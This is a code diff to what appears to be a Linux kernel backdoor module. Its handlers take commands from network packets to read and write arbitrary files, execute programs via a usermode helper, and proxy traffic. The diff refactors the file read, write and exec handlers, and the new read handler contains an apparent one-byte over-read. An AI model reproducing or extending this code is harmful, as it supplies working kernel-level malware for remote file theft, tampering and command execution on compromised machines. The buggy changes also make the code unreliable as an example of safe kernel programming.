@@ -1,7 +1,5 @@
 #include <linux/types.h>
 #include <linux/module.h>
-#include <linux/fcntl.h>
-#include <linux/fs.h>
 #include <linux/inet.h>
 #include <linux/net.h>
 #include <linux/syscalls.h>
@@ -17,48 +15,52 @@
 
 int cmd_handle_file_read(const packet_req_t *packet, u8 **res_buf, size_t *res_buflen)
 {
-    size_t file_pathlen;
+    size_t filename_len;
+    char *filename;
+    int retv;
 
-    file_pathlen = strlen(packet->content) + 1;  // includes nullbyte
-    if (file_pathlen > packet->content_len)
-        return -EOVERFLOW;
+    // mitigate vuln when no nb and packet->content_len = CHUNK_SIZE
+    filename_len = packet->content_len + 1;
+    filename = kzmalloc(filename_len, GFP_KERNEL);
+    if (IS_ERR(filename))
+        return PTR_ERR(filename);
 
-    return file_read(packet->content, res_buf, res_buflen);
+    memcpy(filename, packet->content, filename_len);
+    filename[filename_len - 1] = '\x00'; // add nullbyte
+
+    retv = file_read(filename, res_buf, res_buflen);
+    
+    kzfree(filename, filename_len);
+    
+    return retv;
 }
 
 int cmd_handle_file_write(const packet_req_t *packet, u8 **res_buf, size_t *res_buflen)
 {
-    size_t file_pathlen;
-
-    file_pathlen = strlen(packet->content) + 1;  // includes nullbyte
-    if (file_pathlen > packet->content_len)
-        return -EOVERFLOW;
-
-    return file_write(packet->content, packet->content + file_pathlen, packet->content_len - file_pathlen - 2);
-
-    /*
-    size_t file_pathlen;
-    struct file *file;
+    size_t filename_len;
+    char *filename;
+    size_t content_len;
     int retv;
 
-    file_pathlen = strlen(packet->content);
-    file = filp_open(packet->content, O_WRONLY | O_CREAT, 0);
-    if (IS_ERR(file))
-    {
-        pr_err("[!] failed to open file\n");
-        return PTR_ERR(file);
-    }
+    // mitigate vuln when no nb and packet->content_len = CHUNK_SIZE
+    filename_len = strnlen(packet->content, packet->content_len) + 1;
+    filename = kzmalloc(filename_len, GFP_KERNEL);
+    if (IS_ERR(filename))
+        return PTR_ERR(filename);
 
-    pr_err("[*] writing size: %lu\n", packet->content_len - file_pathlen - 3);
-    retv = kernel_write(file, packet->content + file_pathlen + 1, packet->content_len - file_pathlen - 3, 0);
-    filp_close(file, NULL);
-    if (retv < 0)
-    {
-        pr_err("[!] failed to write to file\n");
-        return retv;
-    }
+    memcpy(filename, packet->content, filename_len);
+    filename[filename_len - 1] = '\x00'; // add nullbyte
+
+    // when filename_len == packet->content_len+1, i.e. content doesn't include nb
+    content_len = packet->content_len - filename_len;
+    if (content_len == SIZE_MAX)
+        content_len = 0;
+
+    retv = file_write(filename, packet->content + filename_len, content_len);
     
-    return 0;*/
+    kzfree(filename, filename_len);
+    
+    return retv;
 }
 
 int cmd_handle_file_exec(const packet_req_t *packet, u8 **res_buf, size_t *res_buflen)
@@ -72,7 +74,7 @@ int cmd_handle_file_exec(const packet_req_t *packet, u8 **res_buf, size_t *res_b
 
     argv[0] = content_mod;
 
-    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+    return file_exec(argv[0], argv, envp);
 }
 
 int cmd_handle_proxy(const packet_req_t *packet, u8 **res_buf, size_t *res_buflen)
